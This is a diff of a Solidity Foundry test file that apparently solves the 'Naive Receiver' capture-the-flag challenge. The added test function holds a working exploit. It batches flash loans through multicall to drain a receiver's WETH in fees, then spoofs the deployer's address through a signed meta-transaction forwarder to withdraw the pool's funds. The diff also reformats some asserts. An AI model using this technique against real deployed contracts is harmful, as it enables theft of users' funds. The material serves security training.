@@ -42,7 +42,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
@@ -77,7 +81,57 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory drainReceiverByFeesAndWithdraw = new bytes[](11);
+
+        for (uint256 i = 0; i < drainReceiverByFeesAndWithdraw.length - 1; ) {
+            drainReceiverByFeesAndWithdraw[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                address(receiver),
+                address(weth),
+                1,
+                ""
+            );
+            unchecked {
+                ++i;
+            }
+        }
+
+        drainReceiverByFeesAndWithdraw[10] = abi.encodePacked(
+            abi.encodeWithSelector(
+                NaiveReceiverPool.withdraw.selector,
+                WETH_IN_POOL + WETH_IN_RECEIVER,
+                payable(recovery)
+            ),
+            bytes12(0),
+            address(deployer)
+        );
+
+        BasicForwarder.Request memory maliciousRequest = BasicForwarder
+            .Request({
+                from: player,
+                target: address(pool),
+                value: 0,
+                gas: gasleft(),
+                nonce: forwarder.nonces(player),
+                data: abi.encodeCall(
+                    pool.multicall,
+                    drainReceiverByFeesAndWithdraw
+                ),
+                deadline: block.timestamp
+            });
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            playerPk,
+            keccak256(
+                abi.encodePacked(
+                    "\x19\x01",
+                    forwarder.domainSeparator(),
+                    forwarder.getDataHash(maliciousRequest)
+                )
+            )
+        );
+        bytes memory signature = abi.encodePacked(r, s, v);
+        forwarder.execute(maliciousRequest, signature);
     }
 
     /**
@@ -88,12 +142,24 @@ contract NaiveReceiverChallenge is Test {
         assertLe(vm.getNonce(player), 2);
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
     }
 }
